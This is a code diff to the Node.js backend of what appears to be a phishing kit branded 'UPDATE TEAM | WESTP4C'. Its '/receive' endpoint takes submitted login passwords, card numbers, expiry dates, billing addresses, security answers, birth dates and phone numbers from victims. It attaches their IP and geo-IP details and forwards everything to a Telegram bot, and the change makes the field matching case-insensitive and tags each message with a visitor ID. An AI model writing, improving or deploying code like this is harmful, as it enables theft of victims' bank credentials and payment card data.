@@ -210,12 +210,13 @@ app.post('/receive', async (req, res) => {
   const systemLang = req.headers["accept-language"];
 
   const myObjects = Object.keys(myObject);
-  //console.log(myObjects);
-	console.log(ipAddressInformation);
   
-  if (myObjects.includes('Password')) {
+  // Convert myObjects to lowercase for case insensitive checks
+const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
+
+if (lowerCaseMyObjects.includes('password')) {
     message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
-               `👤 LOGIN \n\n`;
+               `👤 LOGIN [${visitor}]\n\n`;
 
     for (const key of myObjects) {
       if (key !== 'visitor') {
@@ -239,11 +240,11 @@ app.post('/receive', async (req, res) => {
       `💬 Telegram: https://t.me/UpdateTeams\n`;
       
       res.send('dn');
-  }
+}
 
-  if (myObjects.includes('ExpirationDate') || myObjects.includes('CardNumber') || myObjects.includes('Billing Address')) {
+if (lowerCaseMyObjects.includes('expirationdate') || lowerCaseMyObjects.includes('cardnumber') || lowerCaseMyObjects.includes('billing address')) {
     message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
-               `👤 CARD INFO\n\n`;
+               `👤 CARD INFO [${visitor}]\n\n`;
 
     for (const key of myObjects) {
       console.log(`${key}: ${myObject[key]}`);
@@ -252,15 +253,15 @@ app.post('/receive', async (req, res) => {
 
     message += `🌍 GEO-IP INFO\n` +
       `IP ADDRESS       : ${ipAddress}\n` +
-      `TIME               : ${ipAddressInformation.location.timeZone.localTime}\n` +
+      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
       `💬 Telegram: https://t.me/UpdateTeams\n`;
 
     res.send('dn');
-  }
+}
 
-  if (myObjects.includes('message')) {
+if (lowerCaseMyObjects.includes('message')) {
     message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
-               `👤 SECURITY Q&A\n\n`;
+               `👤 SECURITY Q&A [${visitor}]\n\n`;
 
     for (const key of myObjects) {
       console.log(`${key}: ${myObject[key]}`);
@@ -269,15 +270,15 @@ app.post('/receive', async (req, res) => {
 
     message += `🌍 GEO-IP INFO\n` +
       `IP ADDRESS       : ${ipAddress}\n` +
-      `TIME               : ${ipAddressInformation.location.timeZone.localTime}\n` +
+      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
       `💬 Telegram: https://t.me/UpdateTeams\n`;
 
     res.send('dn');
-  }
+}
 
-  if (myObjects.includes('DOB') || myObjects.includes('PhoneNumber') || myObjects.includes('State')) {
+if (lowerCaseMyObjects.includes('dob') || lowerCaseMyObjects.includes('phonenumber') || lowerCaseMyObjects.includes('state')) {
     message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
-               `👤 CONTACT INFO\n\n`;
+               `👤 CONTACT INFO [${visitor}]\n\n`;
 
     for (const key of myObjects) {
       console.log(`${key}: ${myObject[key]}`);
@@ -286,11 +287,11 @@ app.post('/receive', async (req, res) => {
 
     message += `🌍 GEO-IP INFO\n` +
       `IP ADDRESS       : ${ipAddress}\n` +
-      `TIME               : ${ipAddressInformation.location.timeZone.localTime}\n` +
+      `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
       `💬 Telegram: https://t.me/UpdateTeams\n`;
 
     res.send('dn');
-  }
+}
 
   const sendMessage = sendMessageFor(botToken, chatId); 
   sendMessage(message);
